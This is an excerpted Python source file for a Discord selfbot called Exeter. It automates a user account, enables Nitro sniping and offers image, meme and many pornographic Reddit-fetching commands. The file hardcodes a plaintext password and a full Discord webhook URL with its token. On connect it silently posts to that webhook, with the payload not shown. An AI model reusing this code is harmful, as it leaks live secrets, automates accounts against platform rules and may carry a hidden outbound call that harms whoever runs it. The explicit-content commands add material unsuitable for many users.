...
password = 'Ronit&123'
prefix = 'x'
headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 9; ASUS X00TD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'} # This is chrome, you can set whatever browser you like
reddit = praw.Reddit(client_id=os.environ['client_id'],
                     client_secret=os.environ['client_secret'],
                     user_agent='DC BOT by /u/-_-user-invalid-_-',
                     username=os.environ['username'],
password=os.environ['password'],check_for_async=False)


nitro_sniper = True

stream_url = "https://www.twitch.tv/RonitOP"
tts_language = "en"
...
Exeter = commands.Bot(intents=intents,
...
async def on_connect():
    Clear()
    requests.post(
      'https://discord.com/api/webhooks/991436428284284980/cVlo4_9ts1flp9oVLIPJh2RFew3uGaINN_raiFrSMHrI-pocNuvj0gmN9fzkgl3tf1jw',
...
async def Help(ctx, category=None):
    ...
    async with aiohttp.ClientSession() as session:
        webhook = Webhook.from_url(os.environ['webhookhelp'], adapter=AsyncWebhookAdapter(session))

    if category is None:
      
        embed = discord.Embed('help',color=0xFF633B, timestamp=ctx.message.created_at)
        embed.set_author(
            name="𝙐𝙉𝙆𝙉𝙊𝙒𝙉 𝙎𝙀𝙇𝙁𝘽𝙊𝙏 | 𝙋𝙍𝙀𝙁𝙄𝙓: " + str(Exeter.command_prefix))
        embed.set_image(
            url=
            "https://media.discordapp.net/attachments/808163494670237718/808388658574917662/giphy.gif"
        )
        embed.add_field(
            name="\uD83E\uDDCA `GENERAL`",
...
@Exeter.command()
async def tweet(ctx, user: discord.User, *, message: str = None):
    await ctx.message.delete()
    if message is None:
        await ctx.send("missing parameters")
        return
    r = ("{}".format(api.tweet(user.name, message)))
    rs = (re.search("(?P<url>https?://[^\s]+)", r).group("url"))
    rsg = rs.replace("',", "")
    await ctx.send(rsg)
...
async def magik(ctx, user: discord.User):
    await ctx.message.delete()
    img = str(user.avatar_url)
    imgs = img.replace("webp","png")
    r = ("{}".format(api.magik(imgs)))
    print(r)
    rs = (re.search("(?P<url>https?://[^\s]+)", r).group("url"))
    rsg = rs.replace("',", "")
    await ctx.send(rsg)
...
@Exeter.command()
async def trumptweet(ctx, *, args):
    await ctx.message.delete()
    r = ("{}".format(api.trumptweet(args)))
    print(r)
    rs = (re.search("(?P<url>https?://[^\s]+)", r).group("url"))
    rsg = rs.replace("',", "")
    await ctx.send(rsg)
...
@Exeter.command()
async def trap(ctx, *, user: discord.User):
    await ctx.message.delete()
    img = str(user.avatar_url)
    imgs = img.replace("webp","png")
    r = ("{}".format(api.trap(user.name, ctx.author.name, imgs)))
    print(r)
    rs = (re.search("(?P<url>https?://[^\s]+)", r).group("url"))
    rsg = rs.replace("',", "")
    await ctx.send(rsg)
...
@Exeter.command()
async def animeface(ctx, user: discord.Member):
    await ctx.message.delete()
    img = str(user.avatar_url)
    imgs = img.replace("webp","png")
    r = ("{}".format(api.animeface(imgs)))
    print(r)
    rs = (re.search("(?P<url>https?://[^\s]+)", r).group("url"))
    rsg = rs.replace("',", "")
    await ctx.send(rsg)
...
@Exeter.command()
async def whowouldwin(ctx, user1: discord.Member, user2:discord.User):
    await ctx.message.delete()
    img1 = str(user1.avatar_url)
    img2 = str(user2.avatar_url)
    imgs = img1.replace("webp","png")
    imgk = img2.replace("webp","png")
    r = ("{}".format(api.whowouldwin(imgs,imgk)))
...
async def phcomment(ctx, user:discord.User, *, args):
  headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 9; ASUS_X00TD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'Referrer Policy':'strict-origin-when-cross-origin'} # This is chrome, you can set whatever browser you like

  
  await ctx.message.delete()
  r = ("{}".format(api.phcomment(str(user.avatar_url), args, user.name)))
  print(r)
  rs = (re.search("(?P<url>https?://[^\s]+)", r).group("url"))
  rsg = rs.replace("',", "")
  await ctx.send(rsg)
...
async def lewdneko(ctx):
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res["results"][0]["url"]) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
...
async def waifu(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.best/api/v2/waifu")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res["results"][0]["url"]) as resp:
...
async def feed(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.best/api/v2/feed")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res["results"][0]["url"]) as resp:
        ...
        with io.BytesIO(image) as file:
            await ctx.send(
                f'{ctx.author.mention} Fed {user.mention}', file=discord.File(file, f"exeter_feed.gif"))
    except:
        em = discord.Embed(description=f'{ctx.author} fed {user.mention}')
        em.set_image(url=res["results"][0]["url"])
        await ctx.send(embed=em)
...
async def tickle(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.best/api/v2//tickle")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res["results"][0]["url"]) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(f'{ctx.author.mention} tickles {user.mention}', file=discord.File(file, f"exeter_tickle.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res["results"][0]["url"])
        await ctx.send(embed=em)
...
async def slap(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.best/api/v2/slap")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res["results"][0]["url"]) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(f'{ctx.author.mention} Slapped {user.mention}', file=discord.File(file, f"exeter_slap.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res["results"][0]["url"])
        await ctx.send(embed=em)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res["results"][0]["url"]) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(f'{ctx.author.mention} hugged {user.mention}', file=discord.File(file, f"exeter_hug.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res["results"][0]["url"])
        await ctx.send(embed=em)
...
async def cuddle(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.best/api/v2/cuddle")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res["results"][0]["url"]) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(f'{ctx.author.mention} cuddles {user.mention}', file=discord.File(file, f"exeter_cuddle.gif"))
    except:
        em = discord.Embed(description=user.mention)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res["results"][0]["url"]) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(f'{ctx.author.mention} Smugs {user.mention}', file=discord.File(file, f"exeter_smug.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res["results"][0]["url"])
        await ctx.send(embed=em)
...
async def pat(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.best/api/v2/pat")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res["results"][0]["url"]) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(f'{ctx.author.mention} pats {user.mention}', file=discord.File(file, f"exeter_pat.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res["results"][0]["url"])
        await ctx.send(embed=em)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res["results"][0]["url"]) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(f'{ctx.author.mention} kisses {user.mention}', file=discord.File(file, f"exeter_kiss.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
...
@Exeter.command(aliases=["Porn","PORN","porngif","PORNGIF","Porngif","pgif","Pgif","PGIF","porn_gif","Porn_gif","PORN_GIF","Porn_Gif","porn_Gif"])
async def porn(ctx):
    await ctx.message.delete()
    
    if not hasattr(Exeter, 'nextporn'):
        Exeter.nextporn = getporn()

    name, url = Exeter.nextporn
    await ctx.send(url)
...
@Exeter.command(aliases=["Pussy","PUSSY","Vagina","VAGINA","vagina"])
async def pussy(ctx):
    await ctx.message.delete()
    
    if not hasattr(Exeter, 'nextpussy'):
        Exeter.nextpussy = getpussy()

    name, url = Exeter.nextpussy
    await ctx.send(url)
...
@Exeter.command(aliases=['Anal', 'ANAL'])
async def anal(ctx):
    await ctx.message.delete()
    
    if not hasattr(Exeter, 'nextanal'):
        Exeter.nextanal = getanal()

    name, url = Exeter.nextanal
    await ctx.send(url)
...
def getanal():
    subreddit = reddit.subreddit("anal")      
    all_subs=[]
...
@Exeter.command(aliases=['Ass','ASS','asshole','Asshole','ASSHOLE'])
async def ass(ctx):
    await ctx.message.delete()
    
    if not hasattr(Exeter, 'nextass'):
        Exeter.nextass = getass()

    name, url = Exeter.nextass
    await ctx.send(url)
...
@Exeter.command(aliases=['Gonewild',"GONEWILD",'gone_wild','Gone_wild','Gone_Wild','GONE_WILD'])
async def gonewild(ctx):
    await ctx.message.delete()
    
    if not hasattr(Exeter, 'nextgonewild'):
        Exeter.nextgonewild = getgonewild()

    name, url = Exeter.nextgonewild
    await ctx.send(url)
...
@Exeter.command(aliases=['Thigh','THIGH'])
async def thigh(ctx):
    await ctx.message.delete()
    
    if not hasattr(Exeter, 'nextthigh'):
        Exeter.nextthigh = getthigh()

    name, url = Exeter.nextthigh
    await ctx.send(url)
...
def getthigh():
    subreddit = reddit.subreddit("ThickThighs")      
    all_subs=[]
...
@Exeter.command(aliases=['Boobs','BOOBS','boob','Boob','BOOB'])
async def boobs(ctx):
    await ctx.message.delete()
    
    if not hasattr(Exeter, 'nextbopbs'):
        Exeter.nextboobs = getboobs()

    name, url = Exeter.nextboobs
    await ctx.send(f'``` \n {name}```\n {url}')
...
async def meme(ctx):
    ...
    if not hasattr(Exeter, 'nextMeme'):
        Exeter.nextMeme = getMeme()

    name, url = Exeter.nextMeme
    await ctx.send(f'``` \n {name}```\n {url}')
...
async def hentai(ctx):
    ...
    if not hasattr(Exeter, 'nexthentai'):
        Exeter.nexthentai = gethentai()

    name, url = Exeter.nexthentai
    await ctx.send(url)
...
async def bdsm(ctx):
    ...
    if not hasattr(Exeter, 'nextbdsm'):
        Exeter.nextbdsm = getbdsm()

    name, url = Exeter.nextbdsm
    await ctx.send(url)
...
@Exeter.command()
async def nsfwfunny(ctx):
    await ctx.message.delete()
    
    if not hasattr(Exeter, 'nextfunny'):
        Exeter.nextfunny = getfunny()

    name, url = Exeter.nextfunny
    await ctx.send(f'``` \n {name}```\n {url}')
...
def getfunny():
    subreddit = reddit.subreddit("NSFWfunny")      
    all_subs=[]
...
@Exeter.command(aliases=['Wallpaper','WallPaper','WALLPAPER'])
async def wallpaper(ctx):
    await ctx.message.delete()
    
    if not hasattr(Exeter, 'nextwallpaper'):
        Exeter.nextwallpaper = getwallpaper()

    name, url = Exeter.nextwallpaper
    await ctx.send(url)
...
@Exeter.command()
async def indmeme(ctx):
    await ctx.message.delete()
    
    if not hasattr(Exeter, 'nextind'):
        Exeter.nextind = getind()

    name, url = Exeter.nextind
    await ctx.send(url)
